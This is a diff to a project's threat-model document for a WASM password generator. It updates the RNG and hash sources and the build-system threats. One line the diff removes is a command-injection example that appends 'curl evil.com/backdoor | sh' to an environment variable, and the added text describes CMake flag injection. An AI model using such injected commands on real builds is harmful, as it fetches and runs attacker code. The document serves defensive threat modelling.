@@ -34,7 +34,7 @@ TRUST LEVELS (decreasing order):
 1. Mathematics (provable properties)
 2. Hardware entropy (CPU instructions)
 3. OS kernel (audited by security community)
-4. OpenSSL (25+ years, FIPS validated)
+4. OpenSSL (25+ years, FIPS validated) / WASI random_get (delegates to OS CSPRNG)
 5. C compiler (Zig, open source, reproducible)
 6. Human reviewers (cryptographers, statisticians)
 7. Build automation (GitHub Actions, deterministic)
@@ -76,7 +76,7 @@ def generate_password(length):
 - Brute-force time drops from centuries to hours
 
 **Mitigation**:
-- ✅ Delegate RNG to OpenSSL (no LLM involvement)
+- ✅ Delegate RNG to platform CSPRNG (native: OpenSSL `RAND_bytes`, WASM: WASI `random_get`) — no LLM involvement
 - ✅ Rejection sampling in C (deterministic, verifiable)
 - ✅ Statistical tests detect bias (chi-squared, serial correlation)
 - ⚠️ **Residual risk**: LLM could author biased statistical tests that pass biased data
@@ -402,32 +402,42 @@ crypto.getRandomValues = function(buffer) {
 
 ## Supply Chain Threats
 
-### T11: Compromised OpenSSL Source
+### T11: Compromised OpenSSL Source / Crypto Primitives
 
-**Threat**: Official OpenSSL repository compromised, or our WASI patches introduce vulnerabilities.
+**Threat**: OpenSSL (native CLI) or bundled `sha256_compact.c` (WASM) compromised.
+
+**v3 Platform Abstraction**:
+| Platform | RNG | Hash | OpenSSL Needed? |
+|----------|-----|------|-----------------|
+| Native CLI | OpenSSL `RAND_bytes` | OpenSSL `EVP_SHA256` | Yes |
+| WASM (Web) | WASI `random_get()` | `sha256_compact.c` | **No** |
 
 **Attack vector**:
 ```bash
-# Scenario 1: Attacker compromises official OpenSSL repository
+# Scenario 1 (native): Attacker compromises official OpenSSL repository
 # Pushes malicious commit, creates new tag
-# If our pinned tag is updated without verification, builds pull backdoored code
+# If our pinned tag is updated without verification, CLI builds pull backdoored code
 
-# Scenario 2: Our WASI patches (patches/*.patch) introduce a vulnerability
-# Patches modify build config, random entropy source, and I/O handling
-# A subtle patch change could weaken the CSPRNG
+# Scenario 2 (WASM): sha256_compact.c is modified to produce weak hashes
+# Unlike OpenSSL (25+ years of audit), this bundled code has a smaller trust base
+# A subtle change could weaken the audit hash verification
+
+# Scenario 3 (WASM): WASI random_get() delegates to browser crypto.getRandomValues()
+# which delegates to OS CSPRNG — this chain is browser-dependent
 ```
 
 **Impact**: CRITICAL
 - Backdoored CSPRNG (predictable output)
-- Attacker-controlled entropy
+- Attacker-controlled entropy or weakened hash verification
 
 **Mitigation**:
-- ✅ OpenSSL built from official source at pinned tag (`openssl-3.4.0`) -- not from third-party precompiled binaries
-- ✅ Provenance chain: Official source -> Auditable patches -> Zig compiler -> WASM
-- ✅ `vendor/openssl/BUILD_PROVENANCE.txt` records exact source tag, commit SHA, compiler version, and patches applied
-- ✅ Patches are small, auditable, and checked into the repository (`patches/01-wasi-config.patch`, `patches/02-rand-wasi.patch`, `patches/03-ssl-cert-posix-io.patch`)
-- ⚠️ **TODO**: Verify OpenSSL source tag signature against known-good GPG key
-- 🔴 **MANUAL**: Review patches before accepting changes to `patches/` directory
+- ✅ Native CLI: OpenSSL used at pinned version via system package manager
+- ✅ WASM: OpenSSL removed entirely — no patches, no source build, no vendored library
+- ✅ WASM RNG: WASI `random_get()` delegates to browser `crypto.getRandomValues()` -> OS CSPRNG
+- ✅ WASM Hash: `sha256_compact.c` verified against NIST FIPS 180-4 test vectors (`tests/test_sha256.c`)
+- ✅ `sha256_compact.c` is small (~200 lines), auditable, and checked into the repository
+- ⚠️ **TODO**: Verify OpenSSL source tag signature against known-good GPG key (for native CLI builds)
+- 🔴 **MANUAL**: Review any changes to `sha256_compact.c` — treat as security-critical
 
 ---
 
@@ -514,49 +524,60 @@ steps:
 
 ---
 
-### T15: Makefile Command Injection
+### T15: CMake/Build System Injection (was: Makefile Command Injection)
 
-**Threat**: Malicious environment variables inject commands into Makefile.
+**Status**: RESOLVED in v3. Makefile removed; v3 uses CMake which is declarative.
+
+**Threat**: Malicious environment variables or CMake cache poisoning inject commands into the build system.
 
 **Attack**:
 ```bash
 # Attacker controls CI environment
-export WASM_FILE="paranoid.wasm; curl evil.com/backdoor | sh"
+# CMake is more resistant than Makefiles because variables are not shell-expanded,
+# but custom commands (add_custom_command) can still be exploited:
+cmake -DCUSTOM_FLAG="-DBACKDOOR=1" -B build
 
-# Makefile (vulnerable):
-build:
-    zig cc ... -o $(WASM_FILE)
+# Or: attacker poisons CMakeCache.txt in a pre-existing build directory
+# to override compiler paths or inject flags
 ```
 
-**Impact**: HIGH
-- Arbitrary code execution during build
-- Backdoor injection possible
+**Impact**: MEDIUM (reduced from HIGH — CMake is declarative, not shell-based)
+- CMake does not shell-expand variables like Make does
+- Custom commands are explicit and auditable in CMakeLists.txt
 
 **Mitigation**:
-- ✅ Makefile uses quoted variables
+- ✅ v3 uses CMake (declarative, no shell expansion of variables)
+- ✅ CI always builds from clean directory (`cmake -B build --fresh`)
 - ✅ CI environment is trusted (GitHub-hosted)
-- ⚠️ **TODO**: Shellcheck on Makefile targets
+- ✅ melange builds in isolated environment (no pre-existing CMakeCache.txt)
 
 ---
 
-### T16: SRI Hash Injection Failure
+### T16: BUILD_MANIFEST.json Integrity (was: SRI Hash Injection Failure)
 
-**Threat**: SRI hash computed incorrectly, allowing tampered assets.
+**Status**: Partially resolved in v3. Makefile `sed` injection is eliminated; v3 uses `BUILD_MANIFEST.json` generated by melange at build time and loaded at runtime.
+
+**Threat**: `BUILD_MANIFEST.json` contains incorrect hashes, allowing tampered assets to pass verification.
 
 **Attack**:
 ```bash
-# Makefile (vulnerable):
-WASM_HASH=$(shell openssl dgst -sha384 -binary evil.wasm | base64)
-# Should be paranoid.wasm, not evil.wasm!
+# v3 attack vector: melange.yaml is modified to generate wrong hashes
+# Or: attacker tampers with BUILD_MANIFEST.json after melange generates it
+# but before it is embedded in the final image
+
+# If BUILD_MANIFEST.json lists hash of evil.wasm instead of paranoid.wasm,
+# the runtime SRI check passes for the tampered binary
 ```
 
 **Impact**: HIGH
-- Tampered assets pass SRI check
+- Tampered assets pass runtime SRI check
 - Users trust backdoored WASM
 
 **Mitigation**:
-- ✅ Makefile hardcodes file paths (no variables)
-- ⚠️ **TODO**: Verify SRI hash in Job 2 (independent verification)
+- ✅ v3 generates `BUILD_MANIFEST.json` via melange (no Makefile `sed` injection)
+- ✅ Manifest is generated deterministically from build outputs
+- ✅ Manifest is included in cosign-signed image (tampering breaks signature)
+- ⚠️ **TODO**: Independent hash verification in CI Job 2 (verify BUILD_MANIFEST.json hashes match actual artifacts)
 
 ---
 
@@ -617,7 +638,7 @@ const length = readI32(257);  // Wrong if compiled with gcc!
 
 | Threat | Severity | Status | Residual Risk |
 |--------|----------|--------|---------------|
-| T1: Training Data Leakage | CRITICAL | ✅ Mitigated (OpenSSL CSPRNG) | Low |
+| T1: Training Data Leakage | CRITICAL | ✅ Mitigated (platform CSPRNG: native=OpenSSL, WASM=WASI random_get) | Low |
 | T2: Token Distribution Bias | HIGH | ✅ Mitigated (rejection sampling) | Low |
 | T3: Deterministic Reproduction | HIGH | ✅ Mitigated (hardware entropy) | Low |
 | T4: Prompt Injection Steering | MEDIUM | ⚠️ Residual (code is LLM-authored) | Medium |
@@ -627,12 +648,12 @@ const length = readI32(257);  // Wrong if compiled with gcc!
 | T8: Prototype Pollution | HIGH | ✅ Mitigated (WASM isolation) | Low |
 | T9: GC Memory Retention | MEDIUM | ✅ Mitigated (WASM memory) | Low |
 | T10: Extension Monkey-Patch | CRITICAL | ⚠️ No defense | High |
-| T11: Compromised OpenSSL source | CRITICAL | ✅ Built from official source at pinned tag | Low-Medium |
+| T11: Compromised OpenSSL/Crypto Primitives | CRITICAL | ✅ Native: OpenSSL pinned; WASM: OpenSSL removed, uses sha256_compact.c + WASI random_get | Low-Medium |
 | T12: Zig Backdoor | CRITICAL | ✅ Mitigated (melange reproducible builds + diverse double-compilation) | Low |
 | T13: Actions Supply Chain | CRITICAL | ✅ Mitigated (SHA pins + Dependabot) | Low |
 | T14: Build Environment Tamper | CRITICAL | ✅ Mitigated (cosign + Sigstore attestation + multiparty verify) | Low |
-| T15: Makefile Injection | HIGH | ✅ Mitigated (quoted vars) | Low |
-| T16: SRI Hash Injection | HIGH | ⚠️ Partial (hardcoded paths) | Medium |
+| T15: CMake/Build System Injection | MEDIUM | ✅ Resolved (Makefile removed in v3, CMake is declarative) | Low |
+| T16: BUILD_MANIFEST.json Integrity | HIGH | ✅ Mostly mitigated (melange-generated, cosign-signed) | Low-Medium |
 | T17: WASM Sandbox Escape | CRITICAL | ⚠️ Browser-dependent | Medium |
 | T18: Struct Offset Mismatch | MEDIUM | ✅ Mitigated (runtime verify) | Low |
 
@@ -657,13 +678,14 @@ const length = readI32(257);  // Wrong if compiled with gcc!
 
 ### Medium Priority
 
-4. **T11: Compromised OpenSSL Source**
-   - Verify OpenSSL source tag signature against official GPG key
-   - Review WASI patches (`patches/`) for any security implications
-   - Verify BUILD_PROVENANCE.txt consistency
+4. **T11: Compromised OpenSSL/Crypto Primitives**
+   - Native CLI: Verify OpenSSL source tag signature against official GPG key
+   - WASM: Audit `sha256_compact.c` against NIST FIPS 180-4 reference
+   - WASM: Verify WASI `random_get()` delegates correctly in target browsers
 
-5. **T16: SRI Hash Injection**
+5. **T16: BUILD_MANIFEST.json Integrity**
    - Independent hash verification in CI Job 2
+   - Verify melange-generated manifest matches actual build artifacts
 
 6. **T4: Prompt Injection Steering**
    - Document all design decisions (this file)
@@ -689,7 +711,8 @@ Before deploying any change:
 - [ ] Human cryptographer reviewed C code
 - [ ] SRI hashes verified independently
 - [ ] GitHub Actions still SHA-pinned
-- [ ] OpenSSL source tag hasn't changed unexpectedly; BUILD_PROVENANCE.txt is consistent
+- [ ] Native CLI: OpenSSL source tag hasn't changed unexpectedly
+- [ ] WASM: `sha256_compact.c` passes NIST test vectors; WASI imports are only `random_get`
 - [ ] Build output is bit-for-bit identical (reproducible)
 - [ ] No new WASI imports (only `random_get`)
 
